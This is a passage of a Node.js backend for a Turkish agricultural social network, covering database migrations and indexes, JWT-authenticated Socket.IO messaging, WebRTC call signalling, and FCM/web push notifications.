        // 🔧 Eski tablolarda eksik kolonları ekle (token kolonu yoksa ekle)
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS token TEXT`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS status TEXT NOT NULL DEFAULT 'pending'`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS name TEXT`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS surname TEXT`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS "frontImagePath" TEXT`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS "backImagePath" TEXT`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS "pdfPath" TEXT`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS "reviewedAt" TIMESTAMPTZ`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS "reviewNote" TEXT`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS "createdAt" TIMESTAMPTZ DEFAULT NOW()`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS "updatedAt" TIMESTAMPTZ DEFAULT NOW()`,
        // token kolonu için unique index (eğer yoksa)
        `CREATE UNIQUE INDEX IF NOT EXISTS idx_verif_token_unique ON verification_requests(token) WHERE token IS NOT NULL`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "isVerified" BOOLEAN DEFAULT FALSE`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "privacyExtra" TEXT`,
        // ─── Partnerlik & İş Başvuruları Tablosu ───────────────────────
        `CREATE TABLE IF NOT EXISTS partnership_applications (
            id            TEXT PRIMARY KEY,
            "fullName"    TEXT NOT NULL,
            email         TEXT NOT NULL,
            phone         TEXT,
            "workField"   TEXT NOT NULL,
            message       TEXT,
            status        TEXT NOT NULL DEFAULT 'pending',
            "reviewNote"  TEXT,
            "reviewedAt"  TIMESTAMPTZ,
            "createdAt"   TIMESTAMPTZ DEFAULT NOW(),
            "updatedAt"   TIMESTAMPTZ DEFAULT NOW()
        )`,
    ];

    for (const migSql of columnMigrations) {
        try {
            await pool.query(migSql);
        } catch (e) {
            // Zaten varsa veya başka bir hata varsa sessizce geç
            console.warn(`⚠️ Migrasyon atlandı: ${e.message.split('\n')[0]}`);
        }
    }

    // ==================== İNDEKSLER ====================
    // Her index ayrı try-catch içinde — mevcut tablo şemasına göre hata atlarsa devam eder
    const indexes = [
        [`idx_posts_userId`,           `CREATE INDEX IF NOT EXISTS idx_posts_userId ON posts("userId")`],
        [`idx_posts_createdAt`,        `CREATE INDEX IF NOT EXISTS idx_posts_createdAt ON posts("createdAt" DESC)`],
        [`idx_posts_active`,           `CREATE INDEX IF NOT EXISTS idx_posts_active ON posts("isActive") WHERE "isActive" = TRUE`],
        [`idx_comments_postId`,        `CREATE INDEX IF NOT EXISTS idx_comments_postId ON comments("postId")`],
        [`idx_comments_userId`,        `CREATE INDEX IF NOT EXISTS idx_comments_userId ON comments("userId")`],
        [`idx_likes_postId`,           `CREATE INDEX IF NOT EXISTS idx_likes_postId ON likes("postId")`],
        [`idx_likes_userId`,           `CREATE INDEX IF NOT EXISTS idx_likes_userId ON likes("userId")`],
        [`idx_follows_followerId`,     `CREATE INDEX IF NOT EXISTS idx_follows_followerId ON follows("followerId")`],
        [`idx_follows_followingId`,    `CREATE INDEX IF NOT EXISTS idx_follows_followingId ON follows("followingId")`],
        [`idx_messages_senderId`,      `CREATE INDEX IF NOT EXISTS idx_messages_senderId ON messages("senderId")`],
        [`idx_messages_recipientId`,   `CREATE INDEX IF NOT EXISTS idx_messages_recipientId ON messages("recipientId")`],
        [`idx_messages_createdAt`,     `CREATE INDEX IF NOT EXISTS idx_messages_createdAt ON messages("createdAt" DESC)`],
        [`idx_notifications_userId`,   `CREATE INDEX IF NOT EXISTS idx_notifications_userId ON notifications("userId")`],
        [`idx_notifications_read`,     `CREATE INDEX IF NOT EXISTS idx_notifications_read ON notifications(read) WHERE read = FALSE`],
        [`idx_saves_userId`,           `CREATE INDEX IF NOT EXISTS idx_saves_userId ON saves("userId")`],
        [`idx_products_sellerId`,      `CREATE INDEX IF NOT EXISTS idx_products_sellerId ON products("sellerId")`],
        [`idx_stories_userId`,         `CREATE INDEX IF NOT EXISTS idx_stories_userId ON stories("userId")`],
        [`idx_stories_expiresAt`,      `CREATE INDEX IF NOT EXISTS idx_stories_expiresAt ON stories("expiresAt")`],
        [`idx_users_username`,         `CREATE INDEX IF NOT EXISTS idx_users_username ON users(username)`],
        [`idx_users_email`,            `CREATE INDEX IF NOT EXISTS idx_users_email ON users(email)`],
        [`idx_hashtags_tag`,           `CREATE INDEX IF NOT EXISTS idx_hashtags_tag ON hashtags(tag)`],
        [`idx_login_history_userId`,   `CREATE INDEX IF NOT EXISTS idx_login_history_userId ON login_history("userId")`],
        [`idx_refresh_tokens_userId`,  `CREATE INDEX IF NOT EXISTS idx_refresh_tokens_userId ON refresh_tokens("userId")`],
        [`idx_banned_ips_ip`,          `CREATE INDEX IF NOT EXISTS idx_banned_ips_ip ON banned_ips(ip)`],
        // ⚡ Performans indexleri — sorgu planı optimizasyonu
        // Feed sorgusu: createdAt + isActive birlikte sık kullanılıyor
        [`idx_posts_active_created`,   `CREATE INDEX IF NOT EXISTS idx_posts_active_created ON posts("isActive","createdAt" DESC) WHERE "isActive" = TRUE`],
        // Like/Save varlık kontrolü çok sık çalışır (feed'de her post için)
        [`idx_likes_post_user`,        `CREATE INDEX IF NOT EXISTS idx_likes_post_user ON likes("postId","userId")`],
        [`idx_saves_post_user`,        `CREATE INDEX IF NOT EXISTS idx_saves_post_user ON saves("postId","userId")`],
        // Block kontrolü — feed filtrelemede çift yönlü kontrol
        [`idx_blocks_blocker`,         `CREATE INDEX IF NOT EXISTS idx_blocks_blocker ON blocks("blockerId","blockedId")`],
        [`idx_blocks_blocked`,         `CREATE INDEX IF NOT EXISTS idx_blocks_blocked ON blocks("blockedId","blockerId")`],
        // ⚡ Feed (takip bazlı) için: followerId + followingId çifti — EXISTS subquery hızlandırır
        [`idx_follows_feed`,           `CREATE INDEX IF NOT EXISTS idx_follows_feed ON follows("followerId","followingId") INCLUDE ("followingId")`],
        // Follow kontrolü — isFollowing EXISTS için
        [`idx_follows_pair`,           `CREATE INDEX IF NOT EXISTS idx_follows_pair ON follows("followerId","followingId")`],
        // Message conversation: (senderId,receiverId,createdAt) birlikte sık
        [`idx_messages_conv`,          `CREATE INDEX IF NOT EXISTS idx_messages_conv ON messages("senderId","recipientId","createdAt" DESC)`],
        // Story expiry kontrolü — süresi dolmuş story'leri temizlemek için
        [`idx_stories_user_exp`,       `CREATE INDEX IF NOT EXISTS idx_stories_user_exp ON stories("userId","expiresAt")`],
        // Refresh token lookup — hash ile arama için
        [`idx_refresh_token_hash`,     `CREATE INDEX IF NOT EXISTS idx_refresh_token_hash ON refresh_tokens("tokenHash") WHERE "isActive" = TRUE`],
        // Notification okunmamış sayı — badge için
        [`idx_notif_unread`,           `CREATE INDEX IF NOT EXISTS idx_notif_unread ON notifications("userId",read,"createdAt" DESC) WHERE read = FALSE`],
        // Product search: category + isActive
        [`idx_products_cat_active`,    `CREATE INDEX IF NOT EXISTS idx_products_cat_active ON products(category,"isActive","createdAt" DESC) WHERE "isActive" = TRUE`],
    ];

    for (const [name, indexSql] of indexes) {
        try {
            await pool.query(indexSql);
        } catch (e) {
            console.warn(`⚠️ Index atlandı [${name}]: ${e.message.split('\n')[0]}`);
        }
    }

    // ── 📱 MOBİL: FCM Device Token tablosu ─────────────────────────────────
    await pool.query(`
        CREATE TABLE IF NOT EXISTS device_tokens (
            id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId"    UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            token       TEXT NOT NULL,
            platform    TEXT NOT NULL DEFAULT 'android',
            "isActive"  BOOLEAN NOT NULL DEFAULT TRUE,
            "createdAt" TIMESTAMPTZ DEFAULT NOW(),
            "updatedAt" TIMESTAMPTZ DEFAULT NOW(),
            UNIQUE(token)
        )
    `).catch(() => {});
    await pool.query(`CREATE INDEX IF NOT EXISTS idx_device_tokens_user ON device_tokens ("userId") WHERE "isActive" = TRUE`).catch(() => {});

    // ══════════════════════════════════════════════════════════════════════

    // 🔒 Token blacklist tablosu (cluster-safe logout)
    await pool.query(`
        CREATE TABLE IF NOT EXISTS blacklisted_tokens (
            "tokenHash" TEXT PRIMARY KEY,
            "expiresAt" TIMESTAMPTZ NOT NULL,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);
    await pool.query(`CREATE INDEX IF NOT EXISTS idx_blacklist_expires ON blacklisted_tokens("expiresAt")`).catch(()=>{});

    console.log('✅ Tüm tablolar ve indeksler oluşturuldu (UUID)');
}

// ==================== EXPRESS UYGULAMASI ====================

const app = express();
// 🔒 Güvenli IP alma: sadece 1 seviye proxy güvenilir (Nginx/Cloudflare)
// Saldırgan X-Forwarded-For header'ı sahte yazamaz (proxy doğruluyor)
app.set('trust proxy', 1);
const server = http.createServer(app);
// 📱 Mobil büyük dosya yükleme desteği — timeout'ları artır
server.timeout = 5 * 60 * 1000;          // 5 dakika (büyük fotoğraf/video yükleme)
server.headersTimeout = 6 * 60 * 1000;   // headersTimeout > timeout olmalı
server.requestTimeout = 5 * 60 * 1000;   // istek timeout'u

// ══════════════════════════════════════════════════════════════════════════
// 🔌 SOCKET.IO — Gerçek zamanlı mesajlaşma, bildirimler, online durumu
// ══════════════════════════════════════════════════════════════════════════
// Bağlı kullanıcıların socket ID'lerini tutan harita: userId → Set<socketId>
const onlineUsers = new Map(); // userId (string) → Set<socketId>

if (socketIo) {
    io = new socketIo.Server(server, {
        cors: {
            origin: (origin, callback) => {
                // Native mobil (null origin) — X-Mobile-App-Key kontrolü (Socket.IO handshake'te header yoksa geç)
                // Native mobil bağlantı: JWT auth Socket.IO middleware'de yapılır
                if (!origin) return callback(null, true);
                if (
                    origin.startsWith('https://sehitumitkestitarimmtal.com') ||
                    origin.startsWith('http://sehitumitkestitarimmtal.com') ||
                    (_IS_PROD ? false : origin.startsWith('http://localhost')) ||
                    origin.startsWith('capacitor://') ||
                    origin.startsWith('ionic://') ||
                    origin.startsWith('android://') ||
                    (_IS_PROD ? false : origin.startsWith('http://10.0.2.2')) ||
                    (_IS_PROD ? false : origin.startsWith('exp://'))
                ) return callback(null, true);
                // .env APP_URL
                const appUrl = (process.env.APP_URL || '').replace(/\/$/, '');
                if (appUrl && origin.startsWith(appUrl)) return callback(null, true);
                console.warn(`[SOCKET.IO CORS] Reddedildi: ${origin}`);
                return callback(new Error('CORS: izin verilmedi'), false);
            },
            methods: ['GET', 'POST'],
            credentials: true,
        },
        transports: ['websocket', 'polling'],
        pingTimeout : 60000,
        pingInterval: 25000,
    });

    // ─── Socket.IO kimlik doğrulama middleware ────────────────────────────
    io.use(async (socket, next) => {
        try {
            const token = socket.handshake.auth?.token ||
                          socket.handshake.headers?.authorization?.split(' ')[1] ||
                          socket.handshake.query?.token;
            if (!token) return next(new Error('Token gerekli'));
            const decoded = jwt.verify(token, JWT_SECRET, {
                algorithms : ['HS256'],
                audience   : 'agrolink-client',
                issuer     : 'agrolink',
            });
            const user = await dbGet(
                `SELECT id, username, name, "profilePic", role FROM users WHERE id = $1 AND "isActive" = TRUE`,
                [decoded.id]
            );
            if (!user) return next(new Error('Kullanıcı bulunamadı'));
            socket.userId   = user.id;
            socket.username = user.username;
            socket.user     = user;
            next();
        } catch (e) {
            next(new Error('Geçersiz token'));
        }
    });

    // ─── Socket.IO olayları ───────────────────────────────────────────────
    io.on('connection', (socket) => {
        const userId = socket.userId;
        console.log(`🔌 [SOCKET] Bağlandı: ${socket.username} (${userId}) socketId=${socket.id}`);

        // Online kullanıcı kaydı
        if (!onlineUsers.has(userId)) onlineUsers.set(userId, new Set());
        onlineUsers.get(userId).add(socket.id);

        // DB'de online durumunu güncelle
        dbRun(`UPDATE users SET "isOnline" = TRUE, "lastSeenAt" = NOW() WHERE id = $1`, [userId]).catch(() => {});

        // Herkese bu kullanıcının online olduğunu bildir
        socket.broadcast.emit('user:online', { userId });

        // ── Mesaj gönderme (mobil & web) ─────────────────────────────────
        // 🔒 FIX 2: Socket.IO rate limit — kullanıcı başına mesaj hız sınırı
        const socketMsgCounters = new Map(); // userId → { count, reset }
        const SOCKET_MSG_LIMIT = 30;         // 60 saniyede max 30 mesaj
        const SOCKET_WINDOW_MS = 60 * 1000;

        socket.on('message:send', async (data) => {
            try {
                const { receiverId, content, mediaUrl, mediaType, tempId } = data;
                // Sesli/medya mesajlar içerik olmadan gönderilebilir
                if (!receiverId) return;
                if (!content?.trim() && !mediaUrl) return; // ya metin ya medya zorunlu

                // 🔒 Rate limit kontrolü
                const now = Date.now();
                const counter = socketMsgCounters.get(userId) || { count: 0, reset: now + SOCKET_WINDOW_MS };
                if (now > counter.reset) { counter.count = 0; counter.reset = now + SOCKET_WINDOW_MS; }
                counter.count++;
                socketMsgCounters.set(userId, counter);
                if (counter.count > SOCKET_MSG_LIMIT) {
                    socket.emit('message:error', { error: 'Çok hızlı mesaj gönderiyorsunuz, lütfen bekleyin.' });
                    return;
                }

                // 🔒 Gizli hesap kontrolü: alıcı gizliyse yalnızca onaylı takipçiler mesaj gönderebilir
                const receiverUser = await dbGet(
                    `SELECT "isPrivate" FROM users WHERE id = $1 AND "isActive" = TRUE`,
                    [receiverId]
                );
                if (receiverUser?.isPrivate) {
                    const isApprovedFollower = await dbGet(
                        `SELECT id FROM follow_requests WHERE "requesterId" = $1 AND "targetId" = $2 AND status = 'accepted'`,
                        [userId, receiverId]
                    );
                    if (!isApprovedFollower) {
                        socket.emit('message:error', { error: 'Bu kullanıcı gizli hesaba sahip. Mesaj gönderebilmek için takip isteğinizin onaylanması gerekiyor.' });
                        return;
                    }
                }

                // 🔒 Mesaj boyutu kontrolü — DB şişirmesi önlemi
                const MAX_MSG_LEN = 5000;
                const safeContent = content.trim().slice(0, MAX_MSG_LEN);
                if (!safeContent) return;

                // 🔒 mediaUrl whitelist — sadece kendi sunucusu veya null
                const APP_ORIGIN = (process.env.APP_URL || '').replace(/\/$/, '');
                const safeMediaUrl = (mediaUrl && typeof mediaUrl === 'string' &&
                    (mediaUrl.startsWith('/uploads/') || (APP_ORIGIN && mediaUrl.startsWith(APP_ORIGIN))))
                    ? mediaUrl : null;

                const ALLOWED_MEDIA = ['image', 'video', 'audio', 'voice', null, undefined];
                const safeMediaType = ALLOWED_MEDIA.includes(mediaType) ? mediaType : null;

                const msgId = uuidv4();
                await dbRun(
                    `INSERT INTO messages (id, "senderId", "receiverId", content, "mediaUrl", "mediaType", "createdAt")
                     VALUES ($1, $2, $3, $4, $5, $6, NOW())`,
                    [msgId, userId, receiverId, safeContent, safeMediaUrl, safeMediaType]
                );

                const newMsg = {
                    id         : msgId,
                    senderId   : userId,
                    receiverId,
                    content    : safeContent,
                    mediaUrl   : safeMediaUrl,
                    mediaType  : safeMediaType,
                    createdAt  : new Date().toISOString(),
                    tempId     : tempId || null,
                };

                // Alıcı online ise socket üzerinden gönder
                if (onlineUsers.has(receiverId)) {
                    for (const sid of onlineUsers.get(receiverId)) {
                        io.to(sid).emit('message:receive', newMsg);
                    }
                }

                // Gönderene onay (tempId → gerçek id eşleşmesi)
                socket.emit('message:sent', newMsg);

                // Push bildirim: alıcı online olsa bile web push + FCM göndер
                // (web push: tarayıcı kapalıysa/arka plandaysa çalışır; online kontrolü webpush kütüphanesi yapar)
                const pushPayload = {
                    title: socket.user?.name || socket.username,
                    body : safeContent.substring(0, 100),
                    url  : '/',
                };
                // Web Push (VAPID) — alıcının tarayıcı aboneliği varsa her durumda gönder
                sendPushToUser(receiverId, pushPayload).catch(() => {});

                // FCM push bildirimi (alıcı offline ise)
                if (!onlineUsers.has(receiverId)) {
                    sendFcmPush(receiverId, {
                        title: socket.user?.name || socket.username,
                        body : safeContent.substring(0, 100),
                        data : {
                            type           : 'message',
                            url            : '/',
                            senderId       : userId,
                            messageId      : msgId,
                            actorName      : socket.user?.name || socket.username,
                            actorUsername  : socket.username,
                            actorProfilePic: absoluteUrl(socket.user?.profilePic || ''),
                            messagePreview : safeContent.substring(0, 100),
                        },
                    }).catch(() => {});
                }
            } catch (e) {
                console.error('[SOCKET message:send]', e);
                socket.emit('message:error', { error: 'Mesaj gönderilemedi' });
            }
        });

        // ── Yazıyor göstergesi ────────────────────────────────────────────
        socket.on('message:typing', ({ receiverId, isTyping }) => {
            if (!receiverId) return;
            if (onlineUsers.has(receiverId)) {
                for (const sid of onlineUsers.get(receiverId)) {
                    io.to(sid).emit('message:typing', { senderId: userId, isTyping: !!isTyping });
                }
            }
        });

        // ── Mesaj okundu ──────────────────────────────────────────────────
        socket.on('message:read', async ({ senderId }) => {
            try {
                await dbRun(
                    `UPDATE messages SET "isRead" = TRUE, "readAt" = NOW()
                     WHERE "senderId" = $1 AND "receiverId" = $2 AND "isRead" = FALSE`,
                    [senderId, userId]
                );
                // Gönderene okundu bilgisi
                if (onlineUsers.has(senderId)) {
                    for (const sid of onlineUsers.get(senderId)) {
                        io.to(sid).emit('message:read', { readBy: userId });
                    }
                }
            } catch (e) { /* ignore */ }
        });

        // ── Post beğeni (anlık güncelleme) ────────────────────────────────
        socket.on('post:like', ({ postId, count }) => {
            socket.broadcast.emit('post:like:update', { postId, count, userId });
        });

        // ══════════════════════════════════════════════════════════════════
        // ── Bağlantı kesildi ─────────────────────────────────────────────
        // ═══════════════════════════════════════════════════
        // 📹 GÖRÜNTÜLÜ / SESLİ ARAMA — WebRTC Sinyal Köprüsü
        // ═══════════════════════════════════════════════════

        // Aktif aramalar takibi (callId → { callerId, recipientId, type, startTime })
        const activeCalls = new Map();

        // Arama başlat
        socket.on('call:initiate', async ({ recipientId, type, callId }) => {
            try {
                if (!recipientId || !callId) return;
                const caller = {
                    id        : userId,
                    name      : socket.user.name,
                    username  : socket.username,
                    profilePic: absoluteUrl(socket.user.profilePic || ''),
                };
                const recipientSockets = onlineUsers.get(recipientId);

                if (!recipientSockets || recipientSockets.size === 0) {
                    socket.emit('call:error', { callId, error: 'Kullanıcı çevrimdışı', code: 'USER_OFFLINE' });
                    // FCM ile çevrimdışı push gönder (missed call)
                    sendFcmPush(recipientId, {
                        title: caller.name || caller.username,
                        body : `📞 ${type === 'audio' ? 'Sesli' : 'Görüntülü'} arama cevapsız kaldı`,
                        data : { type: 'missed_call', callerId: userId, callType: type || 'video', actorName: caller.name || caller.username, actorUsername: caller.username, actorProfilePic: caller.profilePic },
                    }).catch(() => {});
                    return;
                }

                // Çağrıyı kaydet
                activeCalls.set(callId, { callerId: userId, recipientId, type: type || 'video', startTime: Date.now() });

                // Alıcıya çağrı bildirimi gönder (TÜM socketlerine)
                recipientSockets.forEach(sid => {
                    io.to(sid).emit('incoming_call', {
                        callId,
                        caller,
                        type  : type || 'video',
                        timestamp: Date.now(),
                    });
                });

                socket.emit('call:ringing', { callId, recipientId });
                console.log(`📞 [CALL] ${caller.username} → ${recipientId} | type: ${type || 'video'} | callId: ${callId}`);

                // 30 saniye içinde cevap gelmezse timeout
                setTimeout(() => {
                    const call = activeCalls.get(callId);
                    if (call && call.callerId === userId) {
                        activeCalls.delete(callId);
                        socket.emit('call:timeout', { callId });
                        recipientSockets.forEach(sid => io.to(sid).emit('call:cancelled', { callId }));
                    }
                }, 30000);

            } catch (e) {
                console.error('[SOCKET call:initiate]', e);
                socket.emit('call:error', { callId, error: 'Arama başlatılamadı' });
            }
        });

        // Aramayı yanıtla (kabul / red)
        socket.on('call:respond', ({ callId, callerId, response }) => {
            const callerSockets = onlineUsers.get(callerId);
            if (callerSockets) {
                const event = response === 'accept' ? 'call_accepted' : 'call_rejected';
                callerSockets.forEach(sid => io.to(sid).emit(event, { callId, responderId: userId }));
            }
            if (response === 'accept') {
                socket.emit('call:accepted', { callId });
                console.log(`📞 [CALL] Kabul: callId=${callId}`);
            } else {
                activeCalls.delete(callId);
                console.log(`📞 [CALL] Red: callId=${callId}`);
            }
        });

        // Aramayı bitir
        socket.on('call:end', ({ callId, recipientId: targetId }) => {
            activeCalls.delete(callId);
            const targetSockets = onlineUsers.get(targetId);
            if (targetSockets) targetSockets.forEach(sid => io.to(sid).emit('call_ended', { callId, endedBy: userId }));
            socket.emit('call_ended', { callId });
            console.log(`📞 [CALL] Bitti: callId=${callId}`);
        });

        // WebRTC: Offer ilet
        socket.on('webrtc_offer', ({ callId, recipientId, offer }) => {
            const recipientSockets = onlineUsers.get(recipientId);
            if (recipientSockets) {
                recipientSockets.forEach(sid => io.to(sid).emit('webrtc_offer', { callId, callerId: userId, offer }));
            }
        });

        // WebRTC: Answer ilet
        socket.on('webrtc_answer', ({ callId, recipientId, answer }) => {
            const recipientSockets = onlineUsers.get(recipientId);
            if (recipientSockets) {
                recipientSockets.forEach(sid => io.to(sid).emit('webrtc_answer', { callId, answer }));
            }
        });

        // WebRTC: ICE Candidate ilet
        socket.on('webrtc_ice_candidate', ({ callId, recipientId, candidate }) => {
            const recipientSockets = onlineUsers.get(recipientId);
            if (recipientSockets) {
                recipientSockets.forEach(sid => io.to(sid).emit('webrtc_ice_candidate', { callId, candidate }));
            }
        });

        socket.on('disconnect', () => {
            console.log(`🔌 [SOCKET] Ayrıldı: ${socket.username} (${userId})`);
            const sockets = onlineUsers.get(userId);
            if (sockets) {
                sockets.delete(socket.id);
                if (sockets.size === 0) {
                    onlineUsers.delete(userId);
                    dbRun(`UPDATE users SET "isOnline" = FALSE, "lastSeenAt" = NOW() WHERE id = $1`, [userId]).catch(() => {});
                    socket.broadcast.emit('user:offline', { userId });
                }
            }
        });
    });

    console.log('✅ Socket.IO başlatıldı (gerçek zamanlı mesajlaşma & bildirimler aktif)');
}

// ══════════════════════════════════════════════════════════════════════════

// 🔒 LOG GÜVENLİĞİ: E-posta adreslerini logda maskele (user@domain → us**@domain)
function maskEmail(email) {
    if (!email || typeof email !== 'string') return '[email]';
    const [local, domain] = email.split('@');
    if (!domain) return '***';
    const masked = local.length <= 2 ? '**' : local.slice(0, 2) + '*'.repeat(Math.min(local.length - 2, 4));
    return `${masked}@${domain}`;
}
// 🔔 FCM PUSH BİLDİRİM YARDIMCI FONKSİYONU
// ══════════════════════════════════════════════════════════════════════════
async function sendFcmPush(userId, { title, body, data = {} }) {
    // ── Web Push (VAPID) — platform='web' tokenları için ───────────────────
    // FCM Admin olmasa bile web push çalışabilir
    if (webpush && process.env.VAPID_PUBLIC_KEY) {
        try {
            const webRows = await dbAll(
                `SELECT token, platform FROM device_tokens WHERE "userId" = $1 AND "isActive" = TRUE AND platform = 'web'`,
                [userId]
            ).catch(() => []);
            for (const row of webRows) {
                try {
                    // Web token formatı: JSON string olarak saklanır { endpoint, keys: { p256dh, auth } }
                    let sub;
                    try { sub = JSON.parse(row.token); } catch(_) { continue; }
                    if (!sub?.endpoint) continue;
                    // url top-level'da olmalı — Service Worker notificationclick handler bunu okur
                    const notifUrl = data?.url
                        ? (data.url.startsWith('http') ? data.url : APP_URL + data.url)
                        : APP_URL;
                    const payload = JSON.stringify({ title, body, icon: '/agro.png', url: notifUrl, data, timestamp: Date.now() });
                    await webpush.sendNotification(sub, payload).catch(async (err) => {
                        if (err.statusCode === 410 || err.statusCode === 404) {
                            await dbRun(`UPDATE device_tokens SET "isActive" = FALSE WHERE token = $1`, [row.token]).catch(() => {});
                        }
                    });
                } catch(_) {}
            }
        } catch(_) {}
    }

    if (!firebaseAdmin) {
        // Sadece web push varsa sessizce dön — FCM uyarısını web-only senaryoda bastır
        if (!webpush) console.warn('[FCM] firebaseAdmin null — FIREBASE_SERVICE_ACCOUNT_JSON .env\'de tanımlı mı?');
        return;
    }
    try {
        // Kullanıcının kayıtlı FCM token'larını al — android, ios ve web (FCM Web token)
        // platform='web' olanlar içinde FCM token (firebase SDK registration token) olabilir,
        // bunlar VAPID sub değil — platform whitelist ile ayırt et
        const rows = await dbAll(
            `SELECT token, platform FROM device_tokens
             WHERE "userId" = $1 AND "isActive" = TRUE
               AND platform IN ('android', 'ios', 'web_fcm')`,
            [userId]
        );
        if (!rows || rows.length === 0) {
            console.warn(`[FCM] userId=${userId} için kayıtlı android/ios/web_fcm token bulunamadı. device_tokens tablosunu kontrol et.`);
            return;
        }

        const tokens = rows.map(r => r.token).filter(Boolean);
        if (tokens.length === 0) return;

        // data alanındaki tüm değerleri string'e çevir (FCM zorunluluğu)
        const safeData = Object.fromEntries(
            Object.entries(data).map(([k, v]) => [k, String(v ?? '')])
        );

        // platform listesine göre per-token mesajlar oluştur
        // sendEachForMulticast tek bir mesajı tüm tokenlara gönderir —
        // platform spesifik bloklar (android/apns/webpush) FCM tarafında
        // ilgili token'ın platform'una göre otomatik uygulanır
        const message = {
            notification: { title, body },
            data: safeData,
            tokens,
            // ── Android: yüksek öncelik + bildirim kanalı ──────────────
            android: {
                priority: 'high',
                notification: {
                    title,
                    body,
                    channelId: 'agrolink_notifications',
                    sound: 'default',
                    clickAction: 'FLUTTER_NOTIFICATION_CLICK',
                },
            },
            // ── APNs (iOS) ──────────────────────────────────────────────
            apns: {
                payload: {
                    aps: {
                        alert: { title, body },
                        sound: 'default',
                        badge: 1,
                    },
                },
                headers: { 'apns-priority': '10' },
            },
            // ── FCM Web Push (web_fcm platform) ────────────────────────
            webpush: {
                notification: {
                    title,
                    body,
                    icon: '/agro.png',
                    badge: '/agro.png',
                    requireInteraction: false,
                },
                fcmOptions: {
                    // FCM webpush.fcmOptions.link mutlaka absolute URL olmalı
                    link: data.url
                        ? (data.url.startsWith('http') ? data.url : APP_URL + (data.url.startsWith('/') ? data.url : '/' + data.url))
                        : APP_URL,
                },
            },
        };

        const response = await firebaseAdmin.messaging().sendEachForMulticast(message);

        // Sonuçları logla
        const successCount = response.responses.filter(r => r.success).length;
        const failCount    = response.responses.filter(r => !r.success).length;
        if (failCount > 0) {
            console.warn(`[FCM] userId=${userId} → ${successCount} başarılı, ${failCount} başarısız`);
        }

        // Geçersiz token'ları temizle
        response.responses.forEach((r, i) => {
            if (!r.success) {
                const code = r.error?.code || '';
                console.warn(`[FCM] Token hatası [${i}]: ${code} — ${r.error?.message || ''}`);
                if (
                    code === 'messaging/invalid-registration-token' ||
                    code === 'messaging/registration-token-not-registered' ||
                    code === 'messaging/unregistered'
                ) {
                    dbRun(`UPDATE device_tokens SET "isActive" = FALSE WHERE token = $1`, [tokens[i]]).catch(() => {});
                }
            }
        });
    } catch (e) {
        console.error('[FCM Push Error]', e.message, e.stack?.split('\n')[1] || '');
    }
}

// ════════════════════════════════════════════════════════════════════════════
// 🔔 AKILLI BİLDİRİM SİSTEMİ — Zaman Bazlı, Gerçek Veriye Dayalı
// ════════════════════════════════════════════════════════════════════════════
//
//  KURULUM: npm install node-cron
//  .env:    SMART_NOTIF_ENABLED=true
//
//  Segmentler:  🟢 Aktif (≤2 gün)  🟡 Orta (3-7 gün)  🔴 Pasif (8-30 gün)
//  Kampanyalar: morning | noon | evening | night | serial_1 | serial_2 | serial_3
//
// ════════════════════════════════════════════════════════════════════════════

let cron = null;
try {
    cron = require('node-cron');
    console.log('✅ node-cron yüklendi — Akıllı Bildirim Sistemi aktif');
} catch (_) {
    console.warn('⚠️  node-cron bulunamadı. (npm install node-cron)');
}

// ── Kullanıcı segmentini belirle ─────────────────────────────────────────────
// Dönüş: 'active' | 'medium' | 'passive' | 'dormant'
async function getUserSegment(userId) {
    try {
        const r = await dbAll(
            `SELECT "lastLogin" FROM users WHERE id=$1 AND "isActive"=TRUE AND "isBanned"=FALSE`,
            [userId]
        );
        if (!r || r.length === 0) return 'dormant';
        const last = r[0].lastLogin;
        if (!last) return 'dormant';
        const daysSince = (Date.now() - new Date(last).getTime()) / (1000 * 60 * 60 * 24);
        if (daysSince <= 2)  return 'active';
        if (daysSince <= 7)  return 'medium';
        if (daysSince <= 30) return 'passive';
        return 'dormant';
    } catch (_) { return 'dormant'; }
}

// ── Kullanıcının tipik giriş saatini hesapla ─────────────────────────────────
// Son 7 günün giriş saatlerinin modunu alır → en sık kullandığı saat
// Veri yoksa null döner (global schedule kullanılır)
async function getUserTypicalHour(userId) {
    try {
        const rows = await dbAll(
            `SELECT hour, COUNT(*) as cnt
             FROM user_login_hours
             WHERE "userId"=$1 AND "loggedAt" > NOW() - INTERVAL '14 days'
             GROUP BY hour ORDER BY cnt DESC LIMIT 1`,
            [userId]
        );
        if (!rows || rows.length === 0) return null;
        return parseInt(rows[0].hour);
    } catch (_) { return null; }
}

// ── Gün içi gerçek trend içerik al ──────────────────────────────────────────
// Bugünün en çok beğenilen/yorum alan postunu getirir
async function getTodayTrendingPost() {
    try {
        const rows = await dbAll(`
            SELECT p.id, p.content,
                   u.name as "authorName",
                   COALESCE(p."likeCount",0) + COALESCE(p."commentCount",0)*2 AS score
            FROM posts p
            JOIN users u ON u.id = p."userId"
            WHERE p."createdAt" > NOW() - INTERVAL '24 hours'
              AND p."isActive" = TRUE
              AND p.content IS NOT NULL
              AND length(p.content) > 10
            ORDER BY score DESC
            LIMIT 1
        `);
        return rows && rows.length > 0 ? rows[0] : null;
    } catch (_) { return null; }
}

// Bugünkü en aktif konu kategorisini getirir (en çok post atılan)
async function getTodayTopCategory() {
    try {
        const rows = await dbAll(`
            SELECT category, COUNT(*) as cnt
            FROM posts
            WHERE "createdAt" > NOW() - INTERVAL '24 hours'
              AND "isActive" = TRUE
              AND category IS NOT NULL
            GROUP BY category
            ORDER BY cnt DESC
            LIMIT 1
        `);
        return rows && rows.length > 0 ? rows[0].category : null;
    } catch (_) { return null; }
}

// Son 1 saatteki yorum sayısını getir (trend kontrol)
async function getRecentCommentCount() {
    try {
